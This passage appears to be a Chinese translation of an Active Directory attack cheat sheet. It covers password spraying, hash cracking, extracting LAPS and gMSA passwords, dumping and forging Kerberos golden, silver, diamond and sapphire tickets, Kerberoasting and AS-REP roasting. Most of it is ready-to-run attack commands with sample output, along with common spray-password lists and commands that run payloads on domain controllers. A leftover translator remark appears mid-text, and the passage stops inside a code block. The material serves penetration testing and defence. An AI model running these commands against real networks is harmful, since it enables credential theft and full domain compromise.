- [Have I Been Pwned founds](https://hashmob.net/hashlists/info/4169-Have%20I%20been%20Pwned%20V8%20(NTLM))
- [Weakpass.com](https://weakpass.com/)
- 在[Methodology and Resources/Hash Cracking.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Hash%20Cracking.md)中阅读更多

```powershell
# 基础词表
# (-O) 将针对32个字符或更少字符的密码进行优化
# (-w 4) 将工作负载设置为“疯狂”
$ hashcat64.exe -m 1000 -w 4 -O -a 0 -o pathtopotfile pathtohashes pathtodico -r myrules.rule --opencl-device-types 1,2

# 根据词表生成自定义掩码
$ git clone https://github.com/iphelix/pack/blob/master/README
$ python2 statsgen.py ../hashcat.potfile -o hashcat.mask
$ python2 maskgen.py hashcat.mask --targettime 3600 --optindex -q -o hashcat_1H.hcmask
```

:警告：如果密码不是机密数据（挑战/CTF），您可以使用在线“破解器”，如：

- [hashmob.net](https://hashmob.net)
- [crackstation.net](https://crackstation.net)
- [hashes.com](https://hashes.com/en/decrypt/hash)

### NTDS可逆加密

`UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED` ([0x00000080](http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm))，如果设置了此位，则该用户的密码将以加密形式存储在目录中，但是以可逆形式存储。

用于加密和解密的密钥是SYSKEY，它存储在注册表中，可以被域管理员提取。
这意味着哈希可以轻易地还原为明文值，因此称为“可逆加密”。

* 列出启用了“使用可逆加密存储密码”的用户

  ```powershell
  Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
  ```

密码检索已由[SecureAuthCorp/secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)和mimikatz处理，它将以明文显示。

## 用户狩猎

有时您需要找到特定用户登录的机器。    
您可以远程查询网络上的每台机器，以获取用户会话的列表。

* CrackMapExec

  ```ps1
  cme smb 10.10.10.0/24 -u Administrator -p 'P@ssw0rd' --sessions
  SMB         10.10.10.10    445    WIN-8OJFTLMU1IG  [+] Enumerated sessions
  SMB         10.10.10.10    445    WIN-8OJFTLMU1IG  \\10.10.10.10            User:Administrator
  ```

* Impacket Smbclient

  ```ps1
  $ impacket-smbclient Administrator@10.10.10.10
  # who
  host:  \\10.10.10.10, user: Administrator, active:     1, idle:     0
  ```

* PowerView Invoke-UserHunter

  ```ps1
  # 查找域管理员或指定用户有会话的计算机
  Invoke-UserHunter
  Invoke-UserHunter -GroupName "RDPUsers"
  Invoke-UserHunter -Stealth
  ```

## 密码喷洒

密码喷洒是指采用大量用户名和单个密码循环遍历的攻击方法。

> 内置管理员账户（RID：500）无论累积了多少次失败的登录尝试，都无法从系统中锁定。

大多数时候，最好的喷洒密码是：

- `P@ssw0rd01`、`Password123`、`Password1`、`Hello123`、`mimikatz`
- `Welcome1`/`Welcome01`
- $Companyname1 :`$Microsoft1`
- 季节年份：`Winter2019*`、`Spring2020!`、`Summer2018?`、`Summer2020`、`July2020!`
- 默认AD密码，简单的变异，如数字-1，特殊字符迭代（*，?，!，#）
- 空密码（哈希：31d6cfe0d16ae931b73c59d7e0c089c0）

### Kerberos预认证暴力破解

使用`kerbrute`工具执行Kerberos预认证暴力破解。

> Kerberos预认证错误不会在Active Directory中以正常的**登录失败事件（4625）**记录，而是以特定的日志记录到**Kerberos预认证失败（4771）**。

* 用户名暴力破解

  ```powershell
  root@kali:~$ ./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 usernames.txt
  ```

* 密码暴力破解

  ```powershell
  root@kali:~$ ./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 rockyou.txt username
  ```

* 密码喷洒

  ```powershell
  root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123
  root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt
  root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt '123456' -v --delay 100 -o kerbrute-passwordspray-123456.log
  ```

### 喷洒预先生成的密码列表

* 使用`crackmapexec`和`mp64`生成密码并对网络上的SMB服务进行喷洒。

  ```powershell
  crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
  ```

* 使用`DomainPasswordSpray`对域中所有用户喷洒一个密码。

  ```powershell
  # https://github.com/dafthack/DomainPasswordSpray
  Invoke-DomainPasswordSpray -Password Summer2021!
  # /!\ 注意账户锁定！
  Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
  ```

* 使用`SMBAutoBrute`。

  ```powershell
  Invoke-SMBAutoBrute -UserList "C:\ProgramData\admins.txt" -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5 -ShowVerbose
  ```

### 针对RDP服务喷洒密码

* 使用[RDPassSpray](https://github.com/xFreed0m/RDPassSpray)针对RDP服务。

  ```powershell
  git clone https://github.com/xFreed0m/RDPassSpray
  python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
  ```

* 使用[hydra](https://github.com/vanhauser-thc/thc-hydra)和[ncrack](https://github.com/nmap/ncrack)针对RDP服务。

```powershell
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
```

根据您上传的文档进行翻译，以下是文档内容的中文翻译版本：

### BadPwdCount属性

> 用户尝试使用错误密码登录账户的次数。值为0表示该值未知。

```powershell
$ crackmapexec ldap 10.0.2.11 -u '用户名' -p '密码' --kdcHost 10.0.2.11 --users
LDAP        10.0.2.11       389    dc01       访客      badpwdcount: 0 pwdLastSet: <从未>
LDAP        10.0.2.11       389    dc01       krbtgt     badpwdcount: 0 pwdLastSet: <从未>
```

## AD用户注释中的密码

```powershell
$ crackmapexec ldap domain.lab -u '用户名' -p '密码' -M user-desc
$ crackmapexec ldap 10.0.2.11 -u '用户名' -p '密码' --kdcHost 10.0.2.11 -M get-desc-users
GET-DESC... 10.0.2.11       389    dc01    [+] 找到以下用户: 
GET-DESC... 10.0.2.11       389    dc01    用户: 访客 描述: 用于访问计算机/域的内置访客账户
GET-DESC... 10.0.2.11       389    dc01    用户: krbtgt 描述: 密钥分发中心服务账户
```

在大多数AD模式中似乎有3-4个字段是通用的：`UserPassword`、`UnixUserPassword`、`unicodePwd`和`msSFU30Password`。

```powershell
enum4linux | grep -i desc

Get-WmiObject -Class Win32_UserAccount -Filter "Domain='COMPANYDOMAIN' AND Disabled='False'" | Select Name, Domain, Status, LocalAccount, AccountType, Lockout, PasswordRequired,PasswordChangeable, Description, SID
```

或者转储AD域并`grep`内容。

```powershell
ldapdomaindump -u 'DOMAIN\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP/
```

## 预创建计算机账户的密码

当勾选`将此计算机账户指定为预Windows 2000计算机`复选框时，计算机账户的密码将与计算机账户的小写形式相同。例如，计算机账户**SERVERDEMO$**的密码将是**serverdemo**。 

```ps1
# 使用默认密码创建机器
# 必须从加入域的设备运行，并连接到域
djoin /PROVISION /DOMAIN <fqdn> /MACHINE evilpc /SAVEFILE C:\temp\evilpc.txt /DEFPWD /PRINTBLOB /NETBIOS evilpc
```

* 当您尝试使用凭据登录时，您应该会收到以下错误代码：`STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`。
* 然后您需要使用[rpcchangepwd.py](https://github.com/SecureAuthCorp/impacket/pull/1304)更改密码。

## 读取LAPS密码

> 使用LAPS自动管理加入域的计算机上的本地管理员密码，以便每个受管计算机上的密码是唯一的，随机生成的，并安全地存储在Active Directory基础设施中。 

### 确定LAPS是否安装

```ps1
Get-ChildItem 'c:\program files\LAPS\CSE\Admpwd.dll'
Get-FileHash 'c:\program files\LAPS\CSE\Admpwd.dll'
Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
```

### 提取LAPS密码

> “ms-mcs-AdmPwd”是一个“机密”的计算机属性，用于存储明文LAPS密码。默认情况下，机密属性只能由域管理员查看，与其他属性不同，它不可供经过身份验证的用户访问

 - 从Windows：

   * adsisearcher（Windows 8+上的本机二进制文件）

     ```powershell
     ([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))").findAll() | ForEach-Object { $_.properties}
     ([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=MACHINE$))").findAll() | ForEach-Object { $_.properties}
     ```

   * [PowerView](https://github.com/PowerShellEmpire/PowerTools)

     ```powershell
     PS > Import-Module .\PowerView.ps1
     PS > Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime
     ```

   * [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)

     ```powershell
     $ Get-LAPSComputers
     计算机名称                密码                                 到期时间         
     ------------                --------                                 ----------         
     example.domain.local        dbZu7;vGaI)Y6w1L                         02/21/2021 22:29:18
     
     $ Find-LAPSDelegatedGroups
     $ Find-AdmPwdExtendedRights
     ```

   * Powershell AdmPwd.PS

     ```powershell
     foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}
     ```

 - 从Linux：

   * [pyLAPS](https://github.com/p0dalirius/pyLAPS) 用于**读取**和**写入**LAPS密码：

     ```bash
     # 读取所有计算机的密码
     ./pyLAPS.py --action get -u '管理员' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1
     # 将随机密码写入特定计算机
     ./pyLAPS.py --action set --computer 'PC01$' -u '管理员' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1
     ```

   * [CrackMapExec](https://github.com/mpgn/CrackMapExec)：

     ```bash
     crackmapexec smb 10.10.10.10 -u '用户' -H '8846f7eaee8fb117ad06bdd830b7586c' -M laps
     ```

   * [LAPSDumper](https://github.com/n00py/LAPSDumper) 

     ```bash
     python laps.py -u '用户' -p '密码' -d 'domain.local'
     python laps.py -u '用户' -p 'e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c' -d 'domain.local' -l 'dc01.domain.local'
     ```

   * ldapsearch

     ```bash
     ldapsearch -x -h  -D "@" -w  -b "dc=<>,dc=<>,dc=<>" "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmPwd`
     ```

### 授予LAPS访问权限

“账户操作员”组的成员可以添加和修改所有非管理员用户和组。由于**LAPS ADM**和**LAPS READ**被视为非管理员组，因此可以将用户添加到其中，并读取LAPS管理员密码

```ps1
Add-DomainGroupMember -Identity 'LAPS ADM' -Members 'user1' -Credential $cred -Domain "domain.local"
Add-DomainGroupMember -Identity 'LAPS READ' -Members 'user1' -Credential $cred -Domain "domain.local"
```

## 读取GMSA密码

> 创建用作服务账户的用户账户很少更改其密码。组托管服务账户（GMSAs）提供了一种更好的方法（从Windows 2012时期开始）。密码由AD管理，并每30天自动轮换为一个256字节的随机生成密码。

### Active Directory中的GMSA属性

* `msDS-GroupMSAMembership`（`PrincipalsAllowedToRetrieveManagedPassword`）- 存储可以访问GMSA密码的安全主体。
* `msds-ManagedPassword` - 此属性包含组托管服务账户密码信息的BLOB。
* `msDS-ManagedPasswordId` - 此构造属性包含当前组MSA托管密码数据的密钥标识符。
* `msDS-ManagedPasswordInterval` - 此属性用于检索组MSA托管密码自动更改前的天数。



# 从AD域提取NT哈希

* [mpgn/CrackMapExec](https://github.com/mpgn/CrackMapExec)

  ```ps1
  # 使用--lsa获取GMSA ID
  crackmapexec ldap domain.lab -u user -p 'PWD' --gmsa-convert-id 00[...]99
  crackmapexec ldap domain.lab -u user -p 'PWD' --gmsa-decrypt-lsa '_SC_GMSA_{[...]}_.....'
  ```

* [rvazarkar/GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)

  ```ps1
  GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
  ```

* [micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper)

  ```powershell
  python3 gMSADumper.py -u User -p Password1 -d domain.local
  ```

* AD域PowerShell

  ```ps1
  $gmsa =  Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword'
  $blob = $gmsa.'msDS-ManagedPassword'
  $mp = ConvertFrom-ADManagedPasswordBlob $blob
  $hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword
  ```

* [kdejoyce/gMSA_Permissions_Collection.ps1](https://gist.github.com/kdejoyce/f0b8f521c426d04740148d72f5ea3f6f#file-gmsa_permissions_collection-ps1) 基于AD域PowerShell模块

## 伪造金票GMSA

> Golden Ticket攻击与Golden GMSA攻击的一个显著区别是，没有办法旋转KDS根密钥秘密。因此，如果KDS根密钥被泄露，没有办法保护与之关联的gMSAs。

:warning: 您不能“强制重置”gMSA密码，因为gMSA的密码从不更改。密码是由KDS根密钥和`ManagedPasswordIntervalInDays`派生的，因此每个域控制器都可以随时计算出密码是什么，过去是什么，以及将来在任何时间点会是什么。

* 使用[GoldenGMSA](https://github.com/Semperis/GoldenGMSA)

  ```ps1
  # 枚举所有gMSAs
  GoldenGMSA.exe gmsainfo
  # 查询特定的gMSA
  GoldenGMSA.exe gmsainfo --sid S-1-5-21-1437000690-1664695696-1586295871-1112
  
  # 转储所有KDS根密钥
  GoldenGMSA.exe kdsinfo
  # 转储特定的KDS根密钥
  GoldenGMSA.exe kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb
  
  # 计算gMSA密码
  # --sid <gMSA SID>: gMSA的SID（必需）
  # --kdskey <Base64编码的blob>: Base64编码的KDS根密钥
  # --pwdid <Base64编码的blob>: msds-ManagedPasswordID属性值的Base64
  GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 # 需要对域的特权访问
  GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45UZXyuYB[...]G2/M= # 需要LDAP访问
  GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45U[...]SM0R7djG2/M= --pwdid AQAAA[..]AAA # 离线模式
  ```

## Kerberos票证

票证用于授予对网络资源的访问权限。票证是一种包含有关用户身份、正在访问的网络服务或资源以及与该资源关联的权限或特权的数据结构。Kerberos票证具有有限的生命周期，并在一段时间后过期，通常为8到12小时。

在Kerberos中有两种类型的票证：

* **票据授权票据**（TGT）：用户在初始认证过程中获得TGT。它用于请求额外的服务票据，而无需用户重新输入其凭据。TGT包含用户的身份、时间戳和用户秘密密钥的加密。

* **服务票据**（ST）：服务票据用于访问特定的网络服务或资源。用户将服务票据呈现给服务或资源，然后使用该票据对用户进行身份验证并授予对所请求资源的访问权限。服务票据包含用户的身份、时间戳和服务秘密密钥的加密。

### 转储Kerberos票证

* Mimikatz: `sekurlsa::tickets /export`

* Rubeus 

  ```ps1
  # 列出可用票证
  Rubeus.exe triage
  
  # 转储一个票证，输出为Kirbi格式
  Rubeus.exe dump /luid:0x12d1f7
  ```

### 重放Kerberos票证

* Mimikatz: `mimikatz.exe "kerberos::ptc C:\temp\TGT_Administrator@lab.local.ccache"`
* CrackMapExec: `KRB5CCNAME=/tmp/administrator.ccache crackmapexec smb 10.10.10 -u user --use-kcache`

### 转换Kerberos票证

在Kerberos认证协议中，ccache和kirbi是两种用于存储Kerberos票证的Kerberos凭证缓存类型。

* 凭据缓存，或称为`"ccache"`，是在认证过程中获得的Kerberos票证的临时存储区域。ccache包含用户的认证凭据，并用于访问网络资源，而无需为每个请求重新输入用户的凭据。

* 微软Windows系统使用的Kerberos集成Windows认证（KIWA）协议也使用了称为`"kirbi"`缓存的凭据缓存。kirbi缓存与标准Kerberos实现中使用的ccache类似，但在其结构和管理的某些方面有所不同。

虽然这两种缓存都服务于存储Kerberos票证以便有效访问网络资源的基本目的，但它们在格式和结构上有所不同。您可以使用以下工具轻松转换它们：

* kekeo: `misc::convert ccache ticket.kirbi`
* impacket: `impacket-ticketConverter SRV01.kirbi SRV01.ccache`

### 传递票证金票

伪造TGT需要：

* `krbtgt`的NT哈希
* 由于最近的`CVE-2021-42287`缓解措施，我们不能使用不存在的账户名

> 伪造金票的方式与银票非常相似。主要区别在于，在这种情况下，不需要向ticketer.py指定服务SPN，必须使用krbtgt的NT哈希。

#### 使用Mimikatz

```powershell
# 获取信息 - Mimikatz
lsadump::lsa /inject /name:krbtgt
lsadump::lsa /patch
lsadump::trust /patch
lsadump::dcsync /user:krbtgt

# 伪造金票 - Mimikatz
kerberos::purge
kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
kerberos::tgt
```

#### 使用Meterpreter 

```powershell
# 获取信息 - Meterpreter(kiwi)
dcsync_ntlm krbtgt
dcsync krbtgt

# 伪造金票 - Meterpreter
load kiwi
golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
golden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307 -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tck
kerberos_ticket_purge
kerberos_ticket_use /root/Downloads/pentestlabuser.tck
kerberos_ticket_list
```

#### 在Linux上使用票证

```powershell
# 使用kekeo将票证kirbi转换为ccache
misc::convert ccache ticket.kirbi

# 或者可以使用Impacket中的ticketer
./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da

ticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrator -extra-sid SID_DOMAIN_B_ENTERPRISE_519
./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519

export KRB5CCNAME=/home/user/ticket.ccache
cat $KRB5CCNAME

# 注意：您可能需要注释掉proxychains配置文件中的proxy_dns设置
./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
```

如果您需要在Windows和Linux之间交换票证，您需要使用`ticket_converter`或`kekeo`进行转换。

```powershell
root@kali:ticket_converter$ python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi
root@kali:ticket_converter$ python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```

缓解措施：

* 很难检测，因为它们是合法的TGT票证
* Mimikatz生成的金票有效期为10年

### 传递票据银牌票据

伪造服务票据（ST）需要机器账户密码（密钥）或服务账户的NT哈希。

```powershell
# 为服务创建票据
mimikatz $ kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARGET-HOST.DOMAIN.FQDN /rc4:TARGET-MACHINE-NT-HASH /service:SERVICE

# 示例
mimikatz $ /kerberos::golden /domain:adsec.local /user:ANY /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /target:DESKTOP-01.adsec.local /service:cifs /ptt
mimikatz $ kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park

# 然后使用与金牌票据相同的步骤
mimikatz $ misc::convert ccache ticket.kirbi

root@kali:/tmp$ export KRB5CCNAME=/home/user/ticket.ccache
root@kali:/tmp$ ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
```

使用银牌票据攻击的有趣服务：

| 服务类型                      | 服务银牌票据           | 攻击                                                         |
| ----------------------------- | ---------------------- | ------------------------------------------------------------ |
| WMI                           | HOST + RPCSS           | `wmic.exe /authority:"kerberos:DOMAIN\DC01" /node:"DC01" process call create "cmd /c evil.exe"` |
| PowerShell Remoting           | CIFS + HTTP + (wsman?) | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC` |
| WinRM                         | HTTP + wsman           | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC` |
| 计划任务                      | HOST                   | `schtasks /create /s dc01 /SC WEEKLY /RU "NT Authority\System" /IN "SCOM Agent Health Check" /IR "C:/shell.ps1"` |
| Windows 文件共享 (CIFS)       | CIFS                   | `dir \\dc01\c$`                                              |
| 包括Mimikatz DCSync的LDAP操作 | LDAP                   | `lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt` |
| Windows 远程服务器管理工具    | RPCSS   + LDAP  + CIFS | /                                                            |


缓解措施：

* 设置属性“账户敏感且不能被委托”以防止使用生成的票据进行横向移动。


### 传递票据钻石票据

> 请求一个合法的低权限TGT并仅重新计算提供krbtgt加密密钥的PAC字段

要求：

* krbtgt NT 哈希
* krbtgt AES 密钥

```ps1
ticketer.py -request -domain 'lab.local' -user 'domain_user' -password 'password' -nthash 'krbtgt/service NT hash' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' -user-id '1337' -groups '512,513,518,519,520' 'baduser'

Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS
```


### 传递票据蓝宝石票据

> 在TGS-REQ(P)（PKINIT）期间使用`S4U2self+U2U`交换请求目标用户的PAC。

目标是尽可能接近合法PAC字段地模仿PAC字段。

要求：

* [Impacket PR#1411](https://github.com/SecureAuthCorp/impacket/pull/1411)
* krbtgt AES 密钥

```ps1
# baduser参数将被忽略
ticketer.py -request -impersonate 'domain_adm' -domain 'lab.local' -user 'domain_user' -password 'password' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' 'baduser'
```


## Kerberoasting

> “服务主体名称（SPN）是服务实例的唯一标识符。SPNs由Kerberos身份验证用于将服务实例与服务登录账户关联。” - [MSDN](https://docs.microsoft.com/fr-fr/windows/desktop/AD/service-principal-names)

任何有效的域用户都可以为任何域服务请求Kerberos票据（ST）。一旦接收到票据，就可以对票据进行离线密码破解，以尝试破解服务运行的用户密码。


* [GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from Impacket Suite
  
  ```powershell
  $ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
  
  Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
  
  ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           
  --------------------  -------------  --------------------------------------------------------  -------------------  -------------------
  active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40  2018-12-03 17:11:11 
  
  $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$424338c0a3c3af43[...]84fd2
  ```
  
* CrackMapExec Module
  ```powershell
  $ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --kerberoast output.txt
  LDAP        10.0.2.11       389    dc01           [*] Windows 10.0 Build 17763 x64 (name:dc01) (domain:lab.local) (signing:True) (SMBv1:False)
  LDAP        10.0.2.11       389    dc01           $krb5tgs$23$*john.doe$lab.local$MSSQLSvc/dc01.lab.local~1433*$efea32[...]49a5e82$b28fc61[...]f800f6dcd259ea1fca8f9
  ```

* Rubeus

  # 统计信息
  ```powershell
    Rubeus.exe kerberoast /stats
    -------------------------------------   ----------------------------------
    | 支持的加密类型 | 数量 |  | 密码最后设置年份 | 数量 |
    -------------------------------------  ----------------------------------
    | RC4_HMAC_DEFAULT          | 1     |  | 2021                   | 1     |
    -------------------------------------  ----------------------------------
  ```

  # Kerberoast（RC4票证）
  ```powershell
    Rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt
  ```

  # Kerberoast（AES票证）
  ```powershell
    # 在msDS-SupportedEncryptionTypes中启用了AES的帐户将请求RC4票证。
    Rubeus.exe kerberoast /tgtdeleg
  ```

  # Kerberoast（RC4票证）
  ```powershell
    # 使用tgtdeleg技巧，枚举并烤制未启用AES的帐户。
    Rubeus.exe kerberoast /rc4opsec
  ```

  * [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

  ```powershell
    Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
  ```

  * [bifrost](https://github.com/its-a-feature/bifrost) 在 **macOS** 机器上

  ```powershell
    ./bifrost -action asktgs -ticket doIF<...snip...>QUw= -service host/dc1-lab.lab.local -kerberoast true
  ```

  * [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)

  ```powershell
    # 对于每个没有SPNs的用户，尝试设置一个SPN（滥用服务主体名称属性上的写权限），打印“kerberoast”哈希，然后删除为该操作设置的临时SPN
    targetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse] [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER] [-k] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key]
  ```

  然后使用正确的hashcat模式破解票证（`$krb5tgs$23`= `etype 23`）

  | 模式    | 描述                                                  |
  | ------- | ----------------------------------------------------- |
  | `13100` | Kerberos 5 TGS-REP etype 23 (RC4)                     |
  | `19600` | Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96) |
  | `19700` | Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96) |

  ```powershell
  ./hashcat -m 13100 -a 0 kerberos_hashes.txt crackstation.txt
  ./john --wordlist=/opt/wordlists/rockyou.txt --fork=4 --format=krb5tgs ~/kerberos_hashes.txt
  ```

  缓解措施：

  * 为具有SPNs的账户设置非常长的密码（> 32个字符）
  * 确保没有用户拥有SPNs

  ## KRB_AS_REP Roasting

  > 如果域用户没有启用Kerberos预身份验证，可以成功请求该用户的AS-REP，并且可以离线破解结构的一个组成部分，类似于kerberoasting

  **要求**：

  - 具有属性 **DONT_REQ_PREAUTH** 的账户（`PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose`）

  * [Rubeus](https://github.com/GhostPack/Rubeus)

  ```powershell
    C:\Rubeus>Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:hashes.asreproast
    [*] 操作：AS-REP烤制
    [*] 目标用户            : TestOU3user
    [*] 目标域          : testlab.local
    [*] SamAccountName         : TestOU3user
    [*] DistinguishedName      : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local
    [*] 使用域控制器: testlab.local (192.168.52.100)
    [*] 构建AS-REQ（无预认证）用于：'testlab.local\TestOU3user'
    [*] 连接到 192.168.52.100:88
    [*] 发送 169 字节
    [*] 收到 1437 字节
    [+] AS-REQ无预认证成功！
    [*] AS-REP哈希:
    
    $krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)...
  ```

  * [GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) 来自Impacket套件

  ```powershell
    $ python GetNPUsers.py htb.local/svc-alfresco -no-pass
    [*] 获取svc-alfresco的TGT
    $krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7a[...]e776b4
    
    # 提取哈希
    root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
    root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
  ```

  * CrackMapExec模块

  ```powershell
    $ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast output.txt
    LDAP        10.0.2.11       389    dc01           $krb5asrep$23$john.doe@LAB.LOCAL:5d1f750[...]2a6270d7$096fc87726c64e545acd4687faf780[...]13ea567d5
  ```

  使用`hashcat`或`john`破解票证。

  ```powershell
  # 使用hashcat破解AS_REP消息
  root@kali:impacket-examples$ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
  root@windows:hashcat$ hashcat64.exe -m 18200 '<AS_REP-hash>' -a 0 c:\wordlists\rockyou.txt
  
  # 使用john破解AS_REP消息
  C:\Rubeus> john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
  ```

  **缓解措施**：

  * 所有账户必须启用“Kerberos预身份验证”（默认启用）。

文档：
* * 

## 不使用域账户的Kerberoasting

> 2022年9月，[Charlie Clark](https://exploit.ph/)发现了一个漏洞，即不通过控制任何Active Directory账户就可以通过KRB_AS_REQ请求获得服务票据（ST）。如果一个主体可以在不需要预认证的情况下进行身份验证（如AS-REP Roasting攻击），那么可以利用它发起**KRB_AS_REQ**请求，并欺骗请求要求**ST**而不是**加密的TGT**，方法是在请求的请求体部分修改**sname**属性。

该技术在以下文章中有详细解释：[Semperis博客文章](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)。

:warning: 您必须提供用户列表，因为我们没有有效账户来使用这种技术查询LDAP。

* [impacket/GetUserSPNs.py 来自PR #1413](https://github.com/fortra/impacket/pull/1413)

  ```powershell
